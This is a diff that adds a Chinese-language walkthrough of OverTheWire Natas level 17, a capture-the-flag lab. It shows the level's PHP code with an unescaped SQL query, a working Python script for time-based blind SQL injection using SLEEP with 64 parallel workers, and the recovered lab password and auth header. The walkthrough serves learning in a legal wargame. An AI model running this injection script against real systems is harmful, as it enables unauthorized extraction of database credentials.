@@ -475,3 +475,89 @@ print(password)
 ```text
 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 ```
+
+### Level17
+PHP源码
+```php
+/* 
+CREATE TABLE `users` ( 
+  `username` varchar(64) DEFAULT NULL, 
+  `password` varchar(64) DEFAULT NULL 
+); 
+*/ 
+
+if(array_key_exists("username", $_REQUEST)) { 
+    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
+    mysql_select_db('natas17', $link); 
+     
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
+    if(array_key_exists("debug", $_GET)) { 
+        echo "Executing query: $query<br>"; 
+    } 
+
+    $res = mysql_query($query, $link); 
+    if($res) { 
+    if(mysql_num_rows($res) > 0) { 
+        //echo "This user exists.<br>"; 
+    } else { 
+        //echo "This user doesn't exist.<br>"; 
+    } 
+    } else { 
+        //echo "Error in query.<br>"; 
+    } 
+
+    mysql_close($link); 
+}
+```
+基本思路跟Level15一样，但是不能靠返回的内容判断了，所以只有靠sleep来盲注了，碰到网络波动就比较尴尬了…保险一点的话sleep的时间得设长一点
+
+先试试`natas18" AND SLEEP(10)#`，确定用户名确实是`natas18`，剩下的部分就跟Level15大同小异了，因为二分在这里太慢，这里就直接判断了，并且各个位并行请求
+```python
+import string
+import urllib.request
+import urllib.parse
+import time
+from multiprocessing import Pool
+
+url = "http://natas17.natas.labs.overthewire.org/index.php?debug=1"
+headers = {
+    "Authorization": (
+        "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
+    ),
+    "Host": "natas17.natas.labs.overthewire.org",
+}
+table =\
+    string.digits +\
+    string.ascii_uppercase +\
+    string.ascii_lowercase
+username = (
+    'natas18" AND '
+    'IF(HEX(SUBSTRING(password, %d, 1))%sHEX("%s"), SLEEP(30), null);#'
+)
+
+
+def check_password(pos, compar, char):
+    time_start = time.time()
+    post_dict = {
+        "username": username % (pos, compar, char)
+    }
+    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
+    req = urllib.request.Request(url, post_data, headers)
+    with urllib.request.urlopen(req, timeout=60):
+        return (time.time() - time_start) > 30
+
+
+def inject_password(pos):
+    for char in table:
+        if check_password(pos, '=', char):
+            return char
+    return ""
+
+
+with Pool(64) as pool:
+    print("".join(pool.map(inject_password, range(1, 65))))
+```
+最后拿到natas18的密码
+```text
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+```
